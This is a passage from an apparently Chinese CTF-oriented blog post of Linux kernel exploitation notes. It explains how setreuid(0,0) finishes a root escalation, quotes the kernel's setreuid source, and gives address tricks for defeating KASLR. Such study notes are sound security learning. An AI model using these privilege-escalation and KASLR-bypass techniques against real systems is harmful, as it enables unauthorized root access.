<p>必须要<code>uid</code>与<code>euid</code>两个字段<strong>都为0</strong>,linux才会认为我们是<code>root</code>用户(在做过一些尝试后,可以确认至少较高版本是这样的,至于低版本尚未确认)</p>
<p>如果仅有其中一个字段为<code>0</code>,内核并不会将我们视作特权用户</p>
<p>提权时当然最好能够同时将这<code>uid</code>与<code>euid</code>都修改为<code>0</code>,但若是条件不允许,仅仅能修改其中的一个,我们就可以利用<code>setreuid(0,0)</code>来进一步的提权</p>
<p>当执行<code>setreuid(0,0)</code>时,只要<code>uid</code>与<code>euid</code>中任意一个为<code>0</code>,便能够将另一个也修改为<code>0</code>,进而成为被操作系统认可的<code>root</code>用户</p>
<p>此外:<code>suid</code>并不具备这样的能力</p>
<p>看内核源码:(<code>/kernel/sys.c</code>)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Unprivileged users may change the real uid to the effective uid</span></span><br><span class="line"><span class="comment"> * or vice versa.  (BSD-style)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If you set the real uid at all, or set the effective uid to a value not</span></span><br><span class="line"><span class="comment"> * equal to the real uid, then the saved uid is set to the new effective uid.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This makes it possible for a setuid program to completely drop its</span></span><br><span class="line"><span class="comment"> * privileges, which is often a useful assertion to make when you are doing</span></span><br><span class="line"><span class="comment"> * a security audit over a program.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The general idea is that a program which uses just setreuid() will be</span></span><br><span class="line"><span class="comment"> * 100% compatible with BSD.  A program which uses just setuid() will be</span></span><br><span class="line"><span class="comment"> * 100% compatible with POSIX with saved IDs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">long</span> __sys_setreuid(<span class="type">uid_t</span> ruid, <span class="type">uid_t</span> euid)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">ns</span> =</span> current_user_ns();</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line">	<span class="type">int</span> retval;</span><br><span class="line">	<span class="type">kuid_t</span> kruid, keuid;</span><br><span class="line"></span><br><span class="line">	kruid = make_kuid(ns, ruid);</span><br><span class="line">	keuid = make_kuid(ns, euid);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((ruid != (<span class="type">uid_t</span>) <span class="number">-1</span>) &amp;&amp; !uid_valid(kruid))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> ((euid != (<span class="type">uid_t</span>) <span class="number">-1</span>) &amp;&amp; !uid_valid(keuid))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	new = prepare_creds();</span><br><span class="line">	<span class="keyword">if</span> (!new)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	old = current_cred();</span><br><span class="line"></span><br><span class="line">	retval = -EPERM;</span><br><span class="line">	<span class="keyword">if</span> (ruid != (<span class="type">uid_t</span>) <span class="number">-1</span>) &#123;</span><br><span class="line">		new-&gt;uid = kruid;</span><br><span class="line">		<span class="keyword">if</span> (!uid_eq(old-&gt;uid, kruid) &amp;&amp;</span><br><span class="line">		    !uid_eq(old-&gt;euid, kruid) &amp;&amp;</span><br><span class="line">		    !ns_capable_setid(old-&gt;user_ns, CAP_SETUID))</span><br><span class="line">			<span class="keyword">goto</span> error;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (euid != (<span class="type">uid_t</span>) <span class="number">-1</span>) &#123;</span><br><span class="line">		new-&gt;euid = keuid;</span><br><span class="line">		<span class="keyword">if</span> (!uid_eq(old-&gt;uid, keuid) &amp;&amp;</span><br><span class="line">		    !uid_eq(old-&gt;euid, keuid) &amp;&amp;</span><br><span class="line">		    !uid_eq(old-&gt;suid, keuid) &amp;&amp;</span><br><span class="line">		    !ns_capable_setid(old-&gt;user_ns, CAP_SETUID))</span><br><span class="line">			<span class="keyword">goto</span> error;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!uid_eq(new-&gt;uid, old-&gt;uid)) &#123;</span><br><span class="line">		retval = set_user(new);</span><br><span class="line">		<span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">goto</span> error;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (ruid != (<span class="type">uid_t</span>) <span class="number">-1</span> ||</span><br><span class="line">	    (euid != (<span class="type">uid_t</span>) <span class="number">-1</span> &amp;&amp; !uid_eq(keuid, old-&gt;uid)))</span><br><span class="line">		new-&gt;suid = new-&gt;euid;</span><br><span class="line">	new-&gt;fsuid = new-&gt;euid;</span><br><span class="line"></span><br><span class="line">	retval = security_task_fix_setuid(new, old, LSM_SETID_RE);</span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	retval = set_cred_ucounts(new);</span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	flag_nproc_exceeded(new);</span><br><span class="line">	<span class="keyword">return</span> commit_creds(new);</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">	abort_creds(new);</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE2(setreuid, <span class="type">uid_t</span>, ruid, <span class="type">uid_t</span>, euid)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> __sys_setreuid(ruid, euid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到,不考虑特权用户的情况下</p>
<p>要设置<code>uid</code>,必须要<code>uid,euid</code>中至少一个为目标id</p>
<p>要设置<code>euid</code>,必须要<code>uid,euid,suid</code>中至少一个为目标id</p>
<h2 id="secondary-startup-64"><a href="#secondary-startup-64" class="headerlink" title="secondary_startup_64"></a>secondary_startup_64</h2><p>一般情况下</p>
<p>在直接映射区<code>direct_mapping_area+0x9d000</code>的位置</p>
<p>会有一个函数指针<code>secondary_startup_64</code></p>
<p>且其就在<code>kernel text</code>开头的部分,一般等于<code>kernel text+0x70</code></p>
<h2 id="内存大小对kernelpwn的影响"><a href="#内存大小对kernelpwn的影响" class="headerlink" title="内存大小对kernelpwn的影响"></a>内存大小对kernelpwn的影响</h2><blockquote>
<p>This file implements KASLR memory randomization for x86_64. It randomizes the virtual address space of kernel memory regions (physical memory mapping, vmalloc &amp; vmemmap) for x86_64. This security feature mitigates exploits relying on predictable kernel addresses.</p>
</blockquote>
<p>kaslr主要针对以下三个区域</p>
<ul>
<li>direct mapping area</li>
<li>vmalloc area</li>
<li>virtual memory map area</li>
</ul>
<p>更多相关可以在<code>/arch/x86/mm/kaslr.c</code>中查看</p>
<p><code>kaslr</code>的随机化粒度是<code>256m</code>,粒度即说明kaslr随机化范围的最小单位</p>
<p>当分配的内存大小小于<code>256M</code>时,因为加载的内存达不到一个粒度</p>
<p>我们可以简单的得到:</p>
<p><code>page_offset_base = heap_leak &amp; 0xffffffffff0000000</code></p>
<p>但在 MEM &gt; 256M 的机器上,这并不总是准确的,我们只能得到本粒度的基址</p>
<p>因此要获得确切的基址就需要办法获得一些能够大致确定其范围的能力,不过好在一般内核pwn题内存都不会大于256m,而就算大于256m,也会优先使用较低的</p>
<p>当 MEM &gt; 16G时,vmemmap_base也不能使用上面的代码实现,不过好在一般也不会有这种情况</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%89%88%E6%9C%AC%E7%9B%B8%E5%85%B3"><span class="toc-number">1.</span> <span class="toc-text">版本相关</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%97%B6"><span class="toc-number">1.1.</span> <span class="toc-text">过时</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#prepare-kernel-cred-NULL"><span class="toc-number">1.1.1.</span> <span class="toc-text">prepare_kernel_cred(NULL)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UAF-cred-jar"><span class="toc-number">1.1.2.</span> <span class="toc-text">UAF cred_jar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pt-regs"><span class="toc-number">1.1.3.</span> <span class="toc-text">pt_regs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#userfaultfd"><span class="toc-number">1.1.4.</span> <span class="toc-text">userfaultfd</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%95%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">引入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#KPTI"><span class="toc-number">1.2.1.</span> <span class="toc-text">KPTI</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">2.</span> <span class="toc-text">结构体</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#tty-struct"><span class="toc-number">2.1.</span> <span class="toc-text">tty_struct</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#seq-operations"><span class="toc-number">2.2.</span> <span class="toc-text">seq_operations</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ldt-struct"><span class="toc-number">2.3.</span> <span class="toc-text">ldt_struct</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#read-ldt"><span class="toc-number">2.3.1.</span> <span class="toc-text">read_ldt</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%A7%E8%8C%83%E5%9B%B4%E6%90%9C%E7%B4%A2%E5%86%85%E5%AD%98"><span class="toc-number">2.3.1.1.</span> <span class="toc-text">大范围搜索内存</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#write-ldt"><span class="toc-number">2.3.2.</span> <span class="toc-text">write_ldt</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#setxattr"><span class="toc-number">2.4.</span> <span class="toc-text">setxattr</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shm-file-data"><span class="toc-number">2.5.</span> <span class="toc-text">shm_file_data</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E9%85%8D"><span class="toc-number">2.5.1.</span> <span class="toc-text">分配</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8A%E6%94%BE"><span class="toc-number">2.5.2.</span> <span class="toc-text">释放</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msg"><span class="toc-number">2.6.</span> <span class="toc-text">msg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pipe"><span class="toc-number">2.7.</span> <span class="toc-text">pipe</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pipe-inode-info"><span class="toc-number">2.7.1.</span> <span class="toc-text">pipe_inode_info</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pipe-buffer"><span class="toc-number">2.7.2.</span> <span class="toc-text">pipe_buffer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sk-buff"><span class="toc-number">2.8.</span> <span class="toc-text">sk_buff</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#key"><span class="toc-number">2.9.</span> <span class="toc-text">key</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#io-uring"><span class="toc-number">2.10.</span> <span class="toc-text">io_uring</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#userfaultfd-1"><span class="toc-number">3.1.</span> <span class="toc-text">userfaultfd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pgv%E9%A1%B5%E7%BA%A7%E5%88%86%E9%85%8D"><span class="toc-number">3.2.</span> <span class="toc-text">pgv页级分配</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#setsockopt"><span class="toc-number">3.3.</span> <span class="toc-text">setsockopt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#modprobe-path"><span class="toc-number">3.4.</span> <span class="toc-text">modprobe_path</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Gadget"><span class="toc-number">4.</span> <span class="toc-text">Gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#work-for-cpu-fn"><span class="toc-number">4.1.</span> <span class="toc-text">work_for_cpu_fn</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7"><span class="toc-number">5.</span> <span class="toc-text">奇技淫巧</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#QEMU%E9%80%83%E9%80%B8"><span class="toc-number">5.1.</span> <span class="toc-text">QEMU逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bin%E7%9B%AE%E5%BD%95%E4%B8%8D%E4%B8%BAROOT"><span class="toc-number">5.2.</span> <span class="toc-text">bin目录不为ROOT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8D%E4%B8%BAROOT"><span class="toc-number">5.3.</span> <span class="toc-text">根目录不为ROOT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E8%AE%BE%E7%BD%AE"><span class="toc-number">5.4.</span> <span class="toc-text">密码设置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#suid"><span class="toc-number">5.5.</span> <span class="toc-text">suid</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#linux%E6%94%AF%E6%8C%81"><span class="toc-number">6.</span> <span class="toc-text">linux支持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#direct-map-addr-to-from-page-addr"><span class="toc-number">6.1.</span> <span class="toc-text">direct_map_addr_to&#x2F;from_page_addr</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#setreuid-setregid"><span class="toc-number">6.2.</span> <span class="toc-text">setreuid&#x2F;setregid</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#secondary-startup-64"><span class="toc-number">6.3.</span> <span class="toc-text">secondary_startup_64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E5%AF%B9kernelpwn%E7%9A%84%E5%BD%B1%E5%93%8D"><span class="toc-number">6.4.</span> <span class="toc-text">内存大小对kernelpwn的影响</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ixout.github.io/posts/57127/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ixout.github.io/posts/57127/&text=kernel小记"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ixout.github.io/posts/57127/&title=kernel小记"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ixout.github.io/posts/57127/&is_video=false&description=kernel小记"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=kernel小记&body=Check out this article: https://ixout.github.io/posts/57127/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ixout.github.io/posts/57127/&title=kernel小记"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ixout.github.io/posts/57127/&title=kernel小记"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ixout.github.io/posts/57127/&title=kernel小记"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ixout.github.io/posts/57127/&title=kernel小记"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ixout.github.io/posts/57127/&name=kernel小记&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ixout.github.io/posts/57127/&t=kernel小记"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>
        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    ixout
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
